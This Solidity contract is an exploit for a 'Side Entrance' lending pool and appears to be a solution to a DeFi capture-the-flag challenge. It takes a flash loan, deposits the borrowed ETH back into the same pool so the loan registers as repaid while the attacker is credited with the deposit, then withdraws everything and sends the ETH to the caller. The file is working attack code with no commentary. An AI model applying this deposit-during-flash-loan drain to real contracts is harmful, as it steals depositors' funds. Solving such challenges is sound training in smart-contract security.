// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    function attack(SideEntranceLenderPool pool, uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

    receive() external payable {}
}
